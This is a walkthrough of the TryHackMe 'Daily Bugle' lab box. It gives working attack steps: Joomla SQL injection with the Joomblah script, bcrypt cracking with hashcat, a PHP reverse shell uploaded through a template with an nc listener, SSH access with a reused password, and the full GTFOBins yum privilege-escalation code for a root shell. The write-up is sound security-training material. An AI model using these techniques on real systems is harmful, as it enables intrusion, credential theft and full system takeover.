## Daily Bungle 
You can access the room from** https://tryhackme.com/room/dailybugle**__
Let’s Start the Machine…
Before getting into the box if you are not using AttackBox make sure you are properly connected to openvpn server and give 2 minutes for the target machine to configure.
**Initial Enumeration
** 
Lets start by enumerating the box by port scanning using nmap. Use the following command
                >   sudo nmap -sV <machine_ip>
The port scanning went well and we have 3 open ports

_nmap Scan Report_
**Port 22** - Its an SSH port and its not gonna give us anything to start.
**Port 80 **- A Web server is running and it might help us to get more information. So lets go check the website.
**Port 3306** - Its a default port used for the MySQL protocol and the database system is MariaDB.
Looking at the website and we got the answer for the first question !!!

**Website Home Page
**
So looking around the website nothing seems informative.So lets run a gobuster in the website.
 > gobuster dir -u <machine_ip> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

**Gobuster Directory List
**So there is a directory for admin(Administrator) and let’s go and check that directory before that we want to check the /robots.txt
From the /robots.txt we get to know that this site is running Joomla CMS, and since the second question is about it’s version. Let’s use CMS scanning tools. There are several tools to enumerate a CMS and am using CMSeeK
Use CMSeeK with the following command to enumerate the website.
   >   sudo python3 <path-to-cmseek.py> -u http://<machine-ip>

**CMSeeK CMS Details
** Now we got the version of Joomla. Answer the second question and lets check the Administrator directory.

Joomla Administrator Login Page
Hooray we found a Joomla login page. But we only got a user name “jonah” mentioned in the box. So lets go and check for any vulnerabilities in Joomla <version>
SQL Injection
Box itself mentioned about a user named Jonah and they prefer not to use SQLMap. So lets look for a python script to enumerate the SQL database.
After a little research we found a python script called Joomblah from github.
Download the code from Github and run the python script as follows.
      >  sudo python <path-to-joomblah.py> http://<machine-ip>

SQL Injection Result
So now we got a username ‘Jonah’ and a hashed password of the user Jonah.
Hash Identification and Cracking
We got a hash and we need to crack it. Before that we need to identify the type of hashing algorithm used. So lets identify the hash using hashid command.
              >    hashid <'hashed password'>

Its a bcrypt hash
The next step is to decrypt the hash. For that we are using hashcat and an alternate option is johntheripper.
I just saved the hash in a file named hash and we are using a wordlist rockyou.txt which is a set of compromised passwords from the social media application developer and contains 14 million passwords.
    >  hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt

Cracked Password
-m flag is used to mention the hash-type
Alternate way to crack a hash is johntheripper and it can be used as below
     john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Now we got a Username ‘jonah’ and a Password so lets go and use them on the joomls login page.

Great we got logged in to the CMS management screen

After some scoop found a possible way to upload a reverse shell in the Templates. Get into templates
PHP Reverse Shell

Extensions -> Templates -> Templates
There are two templates . I chose the second one ‘Protostar Details and Files’

Select Protostar Details and Files
Select the New File from the top panel and give a name and php as file type . then Hit Create.

We will get a notepad to write our script , let’s use it for getting a reverse shell
I am gonna use PHP Reverse Shell by Pentestmonkey from Github . Copy and paste the script and correct the listening machine ip and port number(here i’m using 1234)

Click the Save & Close and we are ready to run the reverse shell.
Let our machine listen to the port using the netcat listener command.
                  >  nc -lvnp <Port-Selected>
Same time we must run the browser with the following url or use tool curl followed by the url in shell itself.
       http://<machine-ip>/templates/protostar/<filename>.php


User Named as **‘jjameson’**
Checking the home directory there is a user with the name ‘jjameson’ but we don't have password to get into it.
So after checking around for some information to exploit the machine found a configuration.php file in the webserver directory /var/www/html

configuration.php
From nmap we know that port 22 is open which is used for SSH, so lets ssh into the machine as “jjameson”
               >  ssh jjameson@<machine-ip>
We will be prompted for the password and give the password we found from config file.

**SSH**
Now we logged in as jjameson and we got our first flag user.txt . For the root.txt flag we need to do privilege escalation.
Privilege Escalation
Lets check our existing sudo privileged command list by running the sudo -l

  > sudo -l Output
That’s it , we found a command that can run as sudo without password.
There is a privilege escalation using yum in gtfobins
    > TF=$(mktemp -d)
   >  cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

 > cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

> cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>  os.execl('/bin/sh','/bin/sh')
EOF

>sudo yum -c $TF/x --enableplugin=y
Just copy and paste the code to jjameson shell .

>yum privilege escalation
We got the root shell. Go and grab the root.txt flag from /root/root.txt

Root Flag
